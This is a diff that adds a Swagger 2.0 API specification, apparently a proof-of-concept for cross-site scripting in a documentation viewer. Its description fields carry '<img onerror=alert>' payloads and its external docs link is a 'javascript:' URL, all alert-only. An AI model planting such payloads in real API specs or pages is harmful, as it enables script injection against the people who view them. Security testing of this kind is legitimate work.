@@ -1,0 +1,20 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <img src=1 onerror=alert('Luthra-XSS')>
+
+  version: production
+basePath: /JSSResource/
+paths:
+  /xss-test:
+    get:
+      summary: XSS Test
+      description: |
+        <img src=1 onerror=alert('Luthra-XSS2')>
+      responses:
+        '200':
+          description: OK
+externalDocs:
+  description: External XSS Link
+  url: javascript:alert('Luthra-Doc-XSS')
